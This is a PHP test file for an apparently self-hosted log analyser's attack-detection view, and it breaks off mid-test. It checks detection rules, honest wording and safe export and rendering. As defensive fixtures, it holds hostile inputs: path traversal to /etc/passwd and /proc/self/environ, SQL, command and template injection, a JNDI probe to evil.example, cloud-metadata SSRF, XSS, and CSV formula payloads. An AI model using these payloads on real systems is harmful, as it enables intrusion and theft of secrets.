<?php
/**
 * Loghound — the Attacks view and the detector behind it.
 *
 * Four things are pinned here, and they are the four ways this feature could become a liability:
 *
 *  1. IT DETECTS WHAT IT SAYS IT DETECTS. Every pattern in the table has at least one request
 *     that must fire it and at least one ordinary request that must NOT, so a rule cannot be
 *     quietly widened into something that matches half the log.
 *  2. IT NEVER CLAIMS TO HAVE BLOCKED ANYTHING. The view is swept for the words a WAF uses. A
 *     log reader that implies it was in the request path is lying about what it is.
 *  3. THE STATUS CODE IS ACTUALLY THE ORDERING. Not a column that happens to be present: the
 *     pattern table and the address table are sorted by what the server answered, and a test
 *     that only checked the column existed would pass on a page sorted by volume — which is
 *     every other tool in this category.
 *  4. THE THREE STATES SURVIVE. Absent `hit_rules_i` is "never evaluated" and must never be
 *     read as "clean", and no new field carries a schema default that would make a document
 *     written last year assert something it never said.
 *
 * @package Loghound
 * @license MIT
 */

declare(strict_types=1);

use Loghound\Panel\Attacks;
use Loghound\Panel\Query;
use Loghound\Panel\Vocabulary;
use Loghound\Score\Attacks as Rules;

/** The codes one request fires, from a hit document built the way Parser::normalize() builds one. */
function lh_atk(array $hit): array
{
    return Rules::of($hit);
}

/** A GET for a path, with an optional query string. */
function lh_atk_get(string $path, string $query = '', array $extra = []): array
{
    return $extra + ['method_s' => 'GET', 'path_s' => $path, 'query_s' => $query];
}

/** Does this request fire this code? */
function lh_atk_fires(array $hit, string $code): bool
{
    return in_array($code, lh_atk($hit), true);
}

/** One shipped schema, as text. */
function lh_atk_schema(string $core): string
{
    return (string) file_get_contents(dirname(__DIR__) . '/solr/' . $core . '/conf/schema.xml');
}

/** The rendered body of the Attacks view, in demo mode. */
function lh_atk_body(): string
{
    $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
    $cfg->set('ui.demo', true);
    $cfg->set('solr.hits_core', 'lh_hits');
    $cfg->set('solr.sessions_core', 'lh_sessions');

    $gw = \Loghound\Panel\Gateway::fromConfig($cfg);
    $view = new Attacks($cfg, $gw);

    $saved = $_GET;
    $_GET = ['v' => 'attacks'];
    ob_start();
    try {
        $view->body();
    } finally {
        $html = (string) ob_get_clean();
        $_GET = $saved;
    }
    return $html;
}

return [

    /* ------------------------------------------------------------------------------------
     * 1. THE VOCABULARY
     * --------------------------------------------------------------------------------- */

    'every rule carries a label, a family, a severity and all three honesty sentences'
        => static function (): void {
            lh_true(count(Rules::RULES) >= 15, 'the table is not a stub');
            $families = Rules::families();

            foreach (Rules::RULES as $code => $rule) {
                lh_true(
                    preg_match('/^atk_[a-z0-9_]{3,40}$/D', $code) === 1,
                    $code . ' is a stable slug, so a stored value cannot collide with a future signal'
                );
                foreach (['label', 'family', 'severity', 'what', 'misses', 'over'] as $key) {
                    lh_has_key($rule, $key, $code);
                    lh_true(is_string($rule[$key]) && $rule[$key] !== '', $code . '.' . $key . ' is said');
                }
                lh_true(
                    isset($families[$rule['family']]),
                    $code . ' is in a family the view knows how to band: ' . $rule['family']
                );
                lh_true(
                    in_array($rule['severity'], Rules::SEVERITIES, true),
                    $code . ' uses one of the four severity words Score\\Rules already uses'
                );
                lh_true(
                    strlen($rule['misses']) > 40,
                    $code . ': "what it misses" is a real sentence. A security page that implies '
                    . 'completeness is worse than one that admits its edges'
                );
                lh_true(
                    strlen($rule['over']) > 40,
                    $code . ': "what it over-reports" is a real sentence, because that is the one '
                    . 'an operator needs before acting on a row'
                );
            }
        },

    'the panel speaks a rule in words and never shows the slug as its label'
        => static function (): void {
            lh_true(Vocabulary::has('hit_flags_ss'), 'the dimension has a vocabulary at all');

            foreach (Rules::codes() as $code) {
                $label = Vocabulary::label('hit_flags_ss', $code);
                lh_true($label !== $code, $code . ' is spoken in words, not printed as a slug');
                lh_same(
                    Rules::describe($code)['label'],
                    $label,
                    $code . ': the words are READ from the rule table, never copied into a second one'
                );
            }
        },

    'an unknown code from an older detector renders rather than disappearing'
        => static function (): void {
            $rule = Rules::describe('atk_from_the_future');
            lh_same('atk_from_the_future', $rule['label'], 'it renders as itself');
            lh_true(isset(Rules::families()[$rule['family']]) || $rule['family'] === 'other');
            lh_true($rule['what'] !== '', 'and says why it cannot be described');
        },

    /* ------------------------------------------------------------------------------------
     * 2. DETECTION — one that must fire, one that must not, for every pattern
     * --------------------------------------------------------------------------------- */

    'path traversal is caught in every encoding, including the double one'
        => static function (): void {
            foreach ([
                '/icons/../../../etc/passwd',
                '/icons/.%2e/.%2e/.%2e/proc/self/environ',
                '/api/uploads/%2e%2e%2f%2e%2e%2f.env',
                '/x/%252e%252e%252fetc/passwd',
                '/x/..%c0%af..%c0%afetc',
                '/a/..\\..\\windows\\win.ini',
            ] as $path) {
                lh_true(
                    lh_atk_fires(lh_atk_get($path), 'atk_traversal'),
                    'traversal in ' . $path
                );
            }
        },

    'an ordinary page is not an attack, whatever else is on the page'
        => static function (): void {
            foreach ([
                ['/', ''],
                ['/pricing', ''],
                ['/assets/app.4f21c9.css', ''],
                ['/blog/2026/09/how-we-index-logs', ''],
                ['/search', 'q=solr+hosting&page=2'],
                ['/api/v1/orders', 'since=2026-09-01&limit=50'],
                ['/robots.txt', ''],
                ['/.well-known/acme-challenge/9tFqV3', ''],
                ['/.well-known/security.txt', ''],
            ] as [$path, $query]) {
                lh_same(
                    [],
                    lh_atk($extra = lh_atk_get($path, $query)),
                    'an ordinary request must fire nothing at all: ' . $path
                );
            }
        },

    'the sensitive-file list catches the two the owner actually saw'
        => static function (): void {
            lh_true(lh_atk_fires(lh_atk_get('/icons/.%2e/.%2e/.%2e/proc/self/environ'), 'atk_sensitive_file'));
            lh_true(lh_atk_fires(lh_atk_get('/api/uploads/%2e%2e%2f%2e%2e%2f.env'), 'atk_sensitive_file'));
            lh_true(lh_atk_fires(lh_atk_get('/.git/config'), 'atk_sensitive_file'));
            lh_true(lh_atk_fires(lh_atk_get('/wp-config.php'), 'atk_sensitive_file'));
            lh_false(lh_atk_fires(lh_atk_get('/docs/environment-variables'), 'atk_sensitive_file'),
                'a page ABOUT environment variables is not a request for one');
        },

    'injection probes are found in the query string, which is where they live'
        => static function (): void {
            $cases = [
                'atk_sql_injection'      => ['/list', "id=1' UNION SELECT password FROM users--"],
                'atk_command_injection'  => ['/ping', 'host=127.0.0.1;cat /etc/passwd'],
                'atk_template_injection' => ['/hello', 'name={{7*7}}'],
                'atk_log4shell'          => ['/', 'x=${jndi:ldap://evil.example/a}'],
                'atk_ssrf'               => ['/fetch', 'url=http://169.254.169.254/latest/meta-data/'],
                'atk_xss'                => ['/search', 'q=<script>alert(1)</script>'],
            ];
            foreach ($cases as $code => [$path, $query]) {
                lh_true(
                    lh_atk_fires(lh_atk_get($path, $query), $code),
                    $code . ' must fire on ' . $path . '?' . $query
                );
            }

            /* THE QUERY STRING IS WHERE THIS LIVES AND IT IS NOT INDEXED. If detection ever moved
               to query time, every one of the six above would silently stop firing — the schema
               gives `query_s` no index and no docValues on purpose. This is the assertion that
               would catch that move. */
            lh_contains(
                lh_atk_schema('hits'),
                '<field name="query_s" type="string" indexed="false" stored="true" docValues="false"/>',
                'so detection has to run at ingest, and this is why'
            );
        },

    'a JNDI probe is reported as itself rather than as generic template injection'
        => static function (): void {
            $codes = lh_atk(lh_atk_get('/', 'x=${jndi:ldap://evil.example/a}'));
            lh_true(in_array('atk_log4shell', $codes, true), 'the specific rule fires');
            lh_false(
                in_array('atk_template_injection', $codes, true),
                'and the generic one stands down, so one probe is one row rather than two'
            );
        },

    'the well-known allowlist admits the ordinary suffixes and refuses the rest'
        => static function (): void {
            foreach (['acme-challenge/abc', 'security.txt', 'assetlinks.json', 'change-password'] as $ok) {
                lh_false(
                    lh_atk_fires(lh_atk_get('/.well-known/' . $ok), 'atk_wellknown_abuse'),
                    '/.well-known/' . $ok . ' is ordinary'
                );
            }
            foreach (['pki.php', 'shell.php', 'cgi-bin/x'] as $bad) {
                lh_true(
                    lh_atk_fires(lh_atk_get('/.well-known/' . $bad), 'atk_wellknown_abuse'),
                    '/.well-known/' . $bad . ' is not a registered suffix'
                );
            }
        },

    'a login POST is marked and a login GET is not, because the finding is the COUNT'
        => static function (): void {
            lh_true(lh_atk_fires(['method_s' => 'POST', 'path_s' => '/wp-login.php'], 'atk_login_probe'));
            lh_false(
                lh_atk_fires(lh_atk_get('/login'), 'atk_login_probe'),
                'a GET of a sign-in page is somebody opening the sign-in page'
            );
            lh_same(
                'info',
                Rules::RULES['atk_login_probe']['severity'],
                'and one POST is severity info, because ONE of these is a person signing in — the '
                . 'view is what turns four hundred of them into a finding'
            );
        },

    'a scanner that names itself is caught, and an ordinary browser is not'
        => static function (): void {
            lh_true(lh_atk_fires(
                lh_atk_get('/', '', ['ua_s' => 'sqlmap/1.8.2#stable (https://sqlmap.org)']),
                'atk_scanner_ua'
            ));
            lh_false(lh_atk_fires(
                lh_atk_get('/', '', ['ua_s' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Chrome/152.0.0.0']),
                'atk_scanner_ua'
            ));
        },

    'WebDAV and cross-site-tracing verbs are named, GET and POST are not'
        => static function (): void {
            foreach (['TRACE', 'TRACK', 'PROPFIND', 'CONNECT'] as $method) {
                lh_true(lh_atk_fires(['method_s' => $method, 'path_s' => '/'], 'atk_method_abuse'), $method);
            }
            foreach (['GET', 'POST', 'HEAD', 'PUT', 'DELETE', 'OPTIONS'] as $method) {
                lh_false(lh_atk_fires(['method_s' => $method, 'path_s' => '/'], 'atk_method_abuse'), $method);
            }
        },

    'an absolute-form request target is a proxy probe only when the host is not ours'
        => static function (): void {
            lh_true(lh_atk_fires(
                ['method_s' => 'GET', 'path_s' => '/', 'host_s' => 'shop.example.com', '_abs_host' => 'evil.example'],
                'atk_proxy_probe'
            ));
            lh_false(
                lh_atk_fires(
                    ['method_s' => 'GET', 'path_s' => '/', 'host_s' => 'shop.example.com', '_abs_host' => 'shop.example.com'],
                    'atk_proxy_probe'
                ),
                'some proxies in front of us send absolute form for our own host, and that is ordinary'
            );
            lh_false(
                lh_atk_fires(['method_s' => 'GET', 'path_s' => '/', 'host_s' => 'shop.example.com'], 'atk_proxy_probe'),
                'and origin form is every ordinary request'
            );
        },

    /* ------------------------------------------------------------------------------------
     * 3. IMPERSONATION — the one that found this feature
     * --------------------------------------------------------------------------------- */

    'the owner\'s own case fires: a named crawler answering from a rented cloud VM'
        => static function (): void {
            $hit = [
                'method_s'      => 'GET',
                'path_s'        => '/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/proc/self/environ',
                'ua_s'          => 'Mozilla/5.0 (compatible; OAI-SearchBot/1.0; +https://openai.com/searchbot)',
                'ua_bot_b'      => true,
                'ua_bot_cat_s'  => 'ai',
                'rdns_s'        => '7.32.89.34.bc.googleusercontent.com',
                'as_type_s'     => 'hosting',
            ];
            $codes = lh_atk($hit);

            lh_true(in_array('atk_crawler_impersonation', $codes, true),
                'OpenAI\'s crawler does not run on somebody\'s Compute Engine instance');
            lh_true(in_array('atk_traversal', $codes, true), 'and the request itself is a traversal attempt');
            lh_true(in_array('atk_sensitive_file', $codes, true), 'for a file that holds the process environment');
        },

    'impersonation stays silent on every kind of absence, because absence is not evidence'
        => static function (): void {
            $base = [
                'method_s'     => 'GET',
                'path_s'       => '/',
                'ua_bot_b'     => true,
                'ua_bot_cat_s' => 'ai',
            ];

            lh_false(
                lh_atk_fires($base, 'atk_crawler_impersonation'),
                'no reverse DNS at all is an enrichment that did not run, not a failed check'
            );
            lh_false(
                lh_atk_fires($base + ['rdns_s' => 'crawl-66-249-66-1.googlebot.com'], 'atk_crawler_impersonation'),
                'a crawler answering from its own operator\'s infrastructure is a crawler'
            );
            lh_false(
                lh_atk_fires(
                    ['method_s' => 'GET', 'path_s' => '/', 'rdns_s' => 'ec2-1-2-3-4.compute-1.amazonaws.com'],
                    'atk_crawler_impersonation'
                ),
                'an ordinary client on EC2 declared nothing, so there is no claim to contradict'
            );
            lh_false(
                lh_atk_fires(
                    ['method_s' => 'GET', 'path_s' => '/', 'ua_bot_b' => true, 'ua_bot_cat_s' => 'monitor',
                     'rdns_s' => 'ec2-1-2-3-4.compute-1.amazonaws.com'],
                    'atk_crawler_impersonation'
                ),
                'an uptime monitor on rented capacity is exactly what an uptime monitor is'
            );
        },

    /* ------------------------------------------------------------------------------------
     * 4. THE THREE STATES
     * --------------------------------------------------------------------------------- */

    'apply() always stamps the version, so "clean" and "never looked at" stay different'
        => static function (): void {
            $clean = Rules::apply(lh_atk_get('/pricing'));
            lh_same(Rules::RULE_VERSION, $clean['hit_rules_i'], 'evaluated, and it says so');
            lh_no_key($clean, 'hit_flags_ss', 'nothing matched, so the list is ABSENT rather than empty');

            $bad = Rules::apply(lh_atk_get('/../../etc/passwd'));
            lh_same(Rules::RULE_VERSION, $bad['hit_rules_i']);
            lh_true(in_array('atk_traversal', $bad['hit_flags_ss'], true));
        },

    'neither new field carries a schema default on either core'
        => static function (): void {
            foreach (['hits', 'sessions'] as $core) {
                $schema = lh_atk_schema($core);
                foreach (['hit_flags_ss', 'hit_rules_i'] as $field) {
                    if (preg_match('~<field name="' . $field . '"[^>]*/>~', $schema, $m) !== 1) {
                        continue;
                    }
                    lh_false(
                        str_contains($m[0], 'default='),
                        $core . '.' . $field . ' must have no default. A default would make every '
                        . 'document ever indexed assert it had been evaluated, which is the exact '
                        . 'lie the version field exists to prevent'
                    );
                }
            }

            lh_contains(lh_atk_schema('hits'), '<field name="hit_rules_i"', 'the hits core carries the version');
            lh_contains(lh_atk_schema('sessions'), '<field name="hit_rules_i"', 'and so does the session that folds it up');
            lh_contains(
                lh_atk_schema('sessions'),
                '<field name="hit_flags_ss" type="strings" indexed="true" stored="true" docValues="true" multiValued="true"/>',
                'the session carries the union of its hits\' flags, filterable and facetable'
            );
        },

    'the status class is a real dimension on the hits core and nowhere near the sessions core'
        => static function (): void {
            lh_contains(
                lh_atk_schema('hits'),
                '<field name="status_class_s" type="string" indexed="true" stored="false" docValues="true"/>',
                'four buckets an operator can read, beside the exact code an investigator wants'
            );
            lh_false(
                str_contains(lh_atk_schema('sessions'), 'name="status_class_s"'),
                'a status belongs to a REQUEST; a session that recorded one 2xx and one 4xx says '
                . 'nothing about which of its requests was which'
            );

            $offered = Query::filterFields();
            lh_has_key($offered, 'status_i', 'the exact code is filterable');
            lh_has_key($offered, 'status_class_s', 'and so is the class');
            lh_no_key(Query::sessionFilterFields(), 'status_i', 'but not on the sessions plane');
            lh_no_key(Query::sessionFilterFields(), 'status_class_s', 'nor the class');
            lh_has_key(Query::hitFilterFields(), 'status_i', 'both reach the hits plane');
            lh_has_key(Query::hitFilterFields(), 'status_class_s');
            lh_same('int', Query::filterFieldKinds()['status_i'] ?? '', 'and the exact code is typed, so '
                . 'a non-numeric value is refused at the request boundary rather than becoming a Solr 400');
        },

    'the four session status counters are indexed, so "received at least one 5xx" is askable'
        => static function (): void {
            $schema = lh_atk_schema('sessions');
            foreach (['2xx', '3xx', '4xx', '5xx'] as $class) {
                lh_contains(
                    $schema,
                    '<field name="status_' . $class . '_i" type="pint" indexed="true" stored="false" docValues="true"/>',
                    'status_' . $class . '_i can be filtered and faceted, not merely read off a document'
                );
            }
        },

    /* ------------------------------------------------------------------------------------
     * 5. THE VIEW — what it claims, and what it refuses to claim
     * --------------------------------------------------------------------------------- */

    'the page never CLAIMS to have blocked, stopped or prevented anything'
        => static function (): void {
            $html = strtolower(lh_atk_body());

            /* THE CLAIM, NOT THE WORD. "blocked none of this" is the sentence this page is
               REQUIRED to carry, so a sweep for the bare word would forbid the very honesty it
               is meant to enforce. What must never appear is the word in the shape of an
               assertion that Loghound acted. */
            foreach ([
                'we blocked', 'was blocked', 'were blocked', 'have been blocked', 'requests blocked',
                'attacks blocked', 'we stopped', 'was prevented', 'were prevented', 'we prevented',
                'protected you', 'mitigated', 'firewall rule', 'threat blocked',
            ] as $claim) {
                lh_false(
                    str_contains($html, $claim),
                    'Loghound reads a log after the fact and was never in the request path: "' . $claim . '"'
                );
            }

            lh_contains($html, 'not a firewall', 'and the page says so in as many words');
            lh_contains($html, 'blocked none of this', 'stated positively, where the reader is');
            lh_contains($html, 'does not prove', 'with the caveat that goes the other way');
        },

    'a 2xx is never worded as a confirmed disclosure'
        => static function (): void {
            $html = strtolower(lh_atk_body());

            foreach ([
                'was disclosed', 'were disclosed', 'data disclosed', 'disclosure confirmed',
                'confirmed disclosure', 'has been compromised', 'you were breached',
            ] as $claim) {
                lh_false(
                    str_contains($html, $claim),
                    'a site whose error page carries a 200 looks identical in a log, so the page '
                    . 'says "answered" and lets the operator fetch the URL: "' . $claim . '"'
                );
            }

            lh_contains($html, 'does not prove a disclosure', 'the caveat is on the page');
            lh_contains($html, 'error page', 'and it names the reason a 200 can mean nothing');
        },

    'the page leads with what was answered, before anything else'
        => static function (): void {
            $html = lh_atk_body();
            $first = strpos($html, 'data-card="atk-answered"');
            $patterns = strpos($html, 'data-card="atk-patterns"');

            lh_true($first !== false, 'the answered card exists');
            lh_true($patterns !== false && $first < $patterns, 'and it is rendered before the pattern table');
            lh_contains($html, 'What the server answered', 'under a heading that says what it is');
        },

    'both ranked tables are ordered by what the server answered, not by volume'
        => static function (): void {
            $php = (string) file_get_contents(dirname(__DIR__) . '/src/Panel/Attacks.php');

            lh_same(
                2,
                preg_match_all("/\\\$b\\['answered'\\], \\\$b\\['ok'\\], \\\$b\\['count'\\]/", $php),
                'the pattern table and the address table both sort by answered first, then by '
                . 'answered-with-a-body, and only then by volume. A page sorted by volume is every '
                . 'other tool in this category'
            );
        },

    'the page states the period it can actually speak for'
        => static function (): void {
            $php = (string) file_get_contents(dirname(__DIR__) . '/src/Panel/Attacks.php');
            lh_contains($php, "'hit_rules_i:[* TO *]'", 'the evaluated population is a real query');
            lh_contains($php, "'-' . self::FQ_EVALUATED", 'and so is its complement');

            $html = lh_atk_body();
            lh_contains($html, 'Never evaluated', 'the counter is on the page');
            lh_contains($html, 'NOT the same as clean', 'and it says what its absence means');
        },

    'every rule\'s misses and over-reports are rendered on the page, not only in the docs'
        => static function (): void {
            $html = lh_atk_body();
            lh_contains($html, 'What it misses');
            lh_contains($html, 'What it over-reports');

            foreach (Rules::RULES as $code => $rule) {
                lh_contains(
                    $html,
                    \Loghound\Security::esc($rule['label']),
                    $code . ' is named on the page'
                );
            }
        },

    'the pattern population is built from the rule table and never from "any flag"'
        => static function (): void {
            $fq = Query::attackFq();
            foreach (Rules::codes() as $code) {
                lh_contains($fq, '"' . $code . '"', $code . ' is named explicitly');
            }
            lh_false(
                str_contains($fq, '[* TO *]') || str_contains($fq, 'hit_flags_ss:*'),
                'asking for "any value of hit_flags_ss" would let a future non-attack signal join '
                . 'this population and inflate every count on the page'
            );
        },

    'the page says which filters this plane could not honour, rather than dropping them quietly'
        => static function (): void {
            $js = (string) file_get_contents(dirname(__DIR__) . '/public/assets/js/views/attacks.js');
            lh_contains($js, 'filters_ignored', 'the front end reads the list');
            lh_contains($js, 'session-level filter', 'and says what kind of filter it was');

            $php = (string) file_get_contents(dirname(__DIR__) . '/src/Panel/Attacks.php');
            lh_contains($php, 'ignoredHitFilters()', 'and every payload carries it');

            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);

            /* THE VIEW IS BUILT AFTER THE REQUEST, because Controller reads the filters in its
               constructor. Building it first and then setting $_GET would test nothing. */
            $saved = $_GET;
            $_GET = ['v' => 'attacks', 'f' => ['bot_verdict_s' => ['bot']]];
            try {
                $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));
                $out = $view->api('answered');
            } finally {
                $_GET = $saved;
            }

            lh_has_key($out, 'filters_ignored');
            lh_true(
                in_array('Verdict', (array) $out['filters_ignored'], true),
                'a verdict is a conclusion about a whole session and cannot narrow a hits query, '
                . 'so the payload names it instead of letting the number look scoped'
            );
        },

    /* A COLUMN THAT IS ALWAYS EMPTY, AND A DRILL-THROUGH THAT NEVER FIRES — one cause.
       requests() maps `session_id_s` and `ip_s` off every document it reads, and the query
       asked Solr for Query::hitFl(), which carries neither. So `session` and `ip` came back
       null on every row of every installation: the CSV export of this dataset shipped two
       permanently blank columns ("Address", "Session"), and the row is only made clickable
       when `session` is non-null, so the "the row opens the session that made the request"
       this card's docblock promises had never once happened.

       The general shape — a payload key read from a field the `fl` does not request — is what
       this pins, by asking for the intersection rather than by naming two fields. */
    'every field this view maps off a document is a field it asked Solr for'
        => static function (): void {
            $body = (string) file_get_contents(dirname(__DIR__) . '/src/Panel/Attacks.php');

            $fn = strstr($body, 'private function requests(): array');
            lh_true(is_string($fn), 'requests() not found');
            $fn = substr((string) $fn, 0, (int) strpos((string) $fn, "\n    }"));

            lh_true(
                (bool) preg_match("/'fl'\s*=>\s*(.+?),\n/s", $fn, $m),
                'the query must declare a field list'
            );
            $fl = $m[1];

            $requested = [];
            if (str_contains($fl, 'Query::hitFl()')) {
                $requested = explode(',', \Loghound\Panel\Query::hitFl());
            }
            if (preg_match_all("/'([,\s]*)?([a-z0-9_,]+)'/", $fl, $extra)) {
                foreach ($extra[2] as $chunk) {
                    foreach (explode(',', $chunk) as $one) {
                        if (trim($one) !== '') {
                            $requested[] = trim($one);
                        }
                    }
                }
            }
            lh_true(count($requested) > 5, 'the field list was read');

            preg_match_all("/\\\$doc\['([a-z0-9_]+)'\]/", $fn, $read);
            $used = array_values(array_unique($read[1]));
            lh_true(count($used) > 5, 'the document reads were found');

            foreach ($used as $field) {
                lh_true(
                    in_array($field, $requested, true),
                    'requests() reads $doc[\'' . $field . '\'] and never asks Solr for it, so it '
                    . 'is null on every row — which is an empty CSV column and, for a field the '
                    . 'row\'s clickability depends on, a drill-through that cannot fire'
                );
            }
        },

    'every column this view exports is a key the payload actually carries'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);

            $saved = $_GET;
            $_GET = ['v' => 'attacks'];
            try {
                $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));
                $exports = (new ReflectionMethod(Attacks::class, 'exports'))->invoke($view);
                $payload = $view->api('requests');
            } finally {
                $_GET = $saved;
            }

            $rows = (array) $payload['requests'];
            lh_true($rows !== [], 'the demo world produced rows to judge');
            $first = (array) $rows[0];

            foreach ((array) $exports['requests']['columns'] as $column) {
                $key = (string) $column[1];
                lh_has_key($first, $key, 'the CSV declares a "' . $column[0] . '" column');
                lh_true(
                    $first[$key] !== null || $key === 'query' || $key === 'host',
                    '"' . $column[0] . '" is null on every row, so the export ships a column that '
                    . 'is blank by construction rather than blank because the data is absent'
                );
            }
        },

    /* THE REPORTING WAS ONE-SIDED. Five of this view's six cards run on the hits core and
       honour a status filter. The sixth — impersonation — runs on the sessions core, where
       there is no status field at all, so the filter is dropped. `filters_ignored` was
       computed from the SESSIONS facet layer, which by construction can never contain a
       hits-only dimension, so the one card that dropped the filter was the one card that
       reported nothing dropped: a number that did not move, under a chip saying it had. */
    'a status filter dropped by the sessions-plane card is named by that card'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);

            $saved = $_GET;
            $_GET = ['v' => 'attacks', 'f' => ['status_i' => ['404']]];
            try {
                $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));
                $sessionsPlane = $view->api('impersonation');
                $hitsPlane = $view->api('answered');
            } finally {
                $_GET = $saved;
            }

            lh_true(
                in_array('Status code', (array) $sessionsPlane['filters_ignored'], true),
                'the sessions-plane card cannot answer a status filter, so it must say so'
            );
            lh_same(
                [],
                (array) $hitsPlane['filters_ignored'],
                'and a hits-plane card, which DOES honour it, must not claim to have dropped it'
            );
        },

    'every card that leaves its view\'s plane reports its own drops'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);

            $saved = $_GET;
            $_GET = ['v' => 'attacks', 'f' => ['status_i' => ['404'], 'bot_verdict_s' => ['bot']]];
            try {
                $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));
                $out = [];
                foreach (['answered', 'patterns', 'requests', 'who', 'impersonation', 'when'] as $card) {
                    $out[$card] = (array) ($view->api($card)['filters_ignored'] ?? null);
                }
            } finally {
                $_GET = $saved;
            }

            foreach ($out as $card => $ignored) {
                lh_true(
                    $ignored !== [],
                    $card . ': one of these two filters is unanswerable on whichever plane this '
                    . 'card runs on, so no card may report nothing'
                );
            }

            lh_true(in_array('Verdict', $out['answered'], true), 'a hits card drops the verdict');
            lh_true(in_array('Status code', $out['impersonation'], true), 'a sessions card drops the status');
        },

    'the filter bar is rendered from the union of both planes, so a hits-plane filter is visible'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);
            $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));

            $saved = $_GET;
            $_GET = ['v' => 'attacks', 'f' => ['status_class_s' => ['2xx']]];
            try {
                $payload = (new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg)))
                    ->facetLayer()->payload();
            } finally {
                $_GET = $saved;
            }

            $fields = array_column((array) $payload['dimensions'], 'field');
            lh_true(
                in_array('status_class_s', $fields, true),
                'a status filter set on this page is REAL — it narrows every hits card — so the '
                . 'bar has to show it and offer a way to remove it. Rendering the bar from the '
                . 'sessions layer would make it invisible and unremovable'
            );
        },

    'the view declares the toolbar controls its queries actually honour'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);
            $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));

            foreach ([Attacks::SCOPE_RANGE, Attacks::SCOPE_HOST, Attacks::SCOPE_FACETS, Attacks::SCOPE_CACHE] as $c) {
                lh_true($view->honours($c), 'honours ' . $c);
            }

            $php = (string) file_get_contents(dirname(__DIR__) . '/src/Panel/Attacks.php');
            lh_contains($php, '$this->hitFqs()', 'the hits cards carry the range, the host and the filters');
            lh_contains($php, '$this->sessionFqs()', 'and the impersonation card carries them on its own plane');
        },

    'an unknown action is refused rather than guessed at'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);
            $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));

            $out = $view->api('definitely_not_an_action');
            lh_has_key($out, 'error');
        },

    /* ------------------------------------------------------------------------------------
     * 6. HOSTILE TEXT — every value on this page was chosen by an attacker
     * --------------------------------------------------------------------------------- */

    'the export declares the path and the query as formula-neutralised kinds'
        => static function (): void {
            $cfg = \Loghound\Config::load('/nonexistent-loghound-attacks-config');
            $cfg->set('ui.demo', true);
            $view = new Attacks($cfg, \Loghound\Panel\Gateway::fromConfig($cfg));

            $requests = $view->exports()['requests'] ?? null;
            lh_true(is_array($requests), 'the answered requests are exportable');

            $kinds = [];
            foreach ($requests['columns'] as $column) {
                $kinds[$column[1]] = $column[2];
            }

            /* ONLY `text` AND `id` GO THROUGH Csv::text(), which is what neutralises a leading
               =, +, -, @, tab or CR. A path declared `number` or `date` would skip it. */
            foreach (['path', 'query', 'patterns'] as $field) {
                lh_true(
                    in_array($kinds[$field] ?? '', ['text', 'id'], true),
                    $field . ' is attacker-chosen and must be neutralised on the way into a spreadsheet'
                );
            }
        },

    'a crafted path cannot escape the CSV as a formula'
        => static function (): void {
            foreach (['=cmd|\' /c calc\'!A1', '+1+1', '-2+3', '@SUM(1:9)', "\t=1", "\r=1"] as $evil) {
                $cell = \Loghound\Csv::text('/x' . $evil);
                lh_false(
                    $cell !== '' && str_starts_with(trim($cell, '"'), '='),
                    'a path opening a formula is neutralised: ' . $evil
                );
            }
            $cell = \Loghound\Csv::text('=1+1');
            lh_false(str_starts_with(trim($cell, '"'), '='), 'and the bare case too');
        },

    'the front end puts every attacker-chosen value in as text, never as markup'
        => static function (): void {
            $js = (string) file_get_contents(dirname(__DIR__) . '/public/assets/js/views/attacks.js');

            foreach (['innerHTML', 'outerHTML', 'insertAdjacentHTML', 'document.write'] as $sink) {
                lh_false(
                    str_contains($js, $sink),
                    'attacks.js renders paths, query strings and reverse DNS names; ' . $sink
                    . ' would make one of them executable'
                );
            }
            lh_false(
                (bool) preg_match('/href\s*:/', $js),
                'nothing on this page becomes a link to a value somebody else chose'
            );
        },

    'nothing in the new code claims an AI wrote it'
        => static function (): void {
            foreach ([
                'src/Score/Attacks.php',
                'src/Panel/Attacks.php',
                'public/assets/js/views/attacks.js',
                'tests/test_attacks.php',
            ] as $rel) {
                $body = (string) file_get_contents(dirname(__DIR__) . '/' . $rel);
                foreach (['Claude', 'Anthropic', 'ChatGPT', 'Copilot', 'generated by AI', 'AI-generated'] as $word) {
                    lh_false(
                        stripos($body, $word) !== false && stripos($body, 'ClaudeBot') === false,
                        $rel . ' must not carry an AI attribution: ' . $word
                    );
                }
            }
        },

    /* ------------------------------------------------------------------------------------
     * 7. COST — this runs once per log line on a box that is also serving traffic
     * --------------------------------------------------------------------------------- */

    'a hostile query string cannot make the detector expensive'
        => static function (): void {
            $huge = str_repeat('a=1&', 200000);
            lh_true(strlen($huge) > Rules::MAX_SURFACE * 100, 'the input really is oversized');

            $t0 = microtime(true);
            for ($i = 0; $i < 50; $i++) {
                lh_atk(lh_atk_get('/search', $huge));
            }
            $ms = (microtime(true) - $t0) * 1000;

            lh_true(
                $ms < 500,
                'fifty 800 KB query strings in under half a second: the surface is bounded BEFORE '
                . 'it is decoded, so one crafted request cannot become measurable ingest cost. Took '
                . round($ms, 1) . ' ms'
            );
        },

    'an ordinary log line costs almost nothing'
        => static function (): void {
            $t0 = microtime(true);
            for ($i = 0; $i < 20000; $i++) {
